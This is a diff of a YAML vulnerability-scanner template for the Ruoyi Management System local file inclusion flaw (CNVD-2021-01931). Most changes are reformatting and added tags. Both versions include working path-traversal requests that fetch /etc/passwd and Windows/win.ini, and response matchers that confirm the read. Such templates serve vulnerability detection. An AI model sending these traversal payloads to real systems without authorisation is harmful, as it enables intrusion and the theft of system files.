@@ -1,24 +1,29 @@
 id: CNVD-2021-01931
 
 info:
-    name: Ruoyi Management System - Local File Inclusion
-    author: MaxSecurity(https://github.com/MaxSecurity)
-    severity: high
-    verified: true
-    description: The Ruoyi Management System contains a local file inclusion vulnerability that allows attackers to retrieve arbitrary files from the operating system.
-    reference:
-        - https://disk.scan.cm/All_wiki/%E4%BD%A9%E5%A5%87PeiQi-WIKI-POC-2021-7-20%E6%BC%8F%E6%B4%9E%E5%BA%93/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931.md?hash=zE0KEPGJ
-
+  name: Ruoyi Management System - Local File Inclusion
+  author: MaxSecurity
+  severity: high
+  verified: true
+  description: |-
+    The Ruoyi Management System contains a local file inclusion vulnerability that allows attackers to retrieve arbitrary files from the operating system.
+  reference:
+    - https://disk.scan.cm/All_wiki/%E4%BD%A9%E5%A5%87PeiQi-WIKI-POC-2021-7-20%E6%BC%8F%E6%B4%9E%E5%BA%93/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931.md?hash=zE0KEPGJ
+  tags: cnvd,cnvd2021,ruoyi,lfi
+  created: 2021/07/20
 
 rules:
-    linux0:
-        request:
-            method: GET
-            path: /common/download/resource?resource=/profile/../../../../etc/passwd
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-    windows0:
-        request:
-            method: GET
-            path: /common/download/resource?resource=/profile/../../../../Windows/win.ini
-        expression: response.status == 200 && response.body.bcontains(b"bit app support") && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")
-expression: linux0() || windows0()
+  r0:
+    request:
+      method: GET
+      path: /common/download/resource?resource=/profile/../../../../etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r1:
+    request:
+      method: GET
+      path: /common/download/resource?resource=/profile/../../../../Windows/win.ini
+    expression: |
+      response.status == 200 &&
+      response.body.ibcontains(b"[fonts]") &&
+      response.body.ibcontains(b"[extensions]")
+expression: r0() || r1()
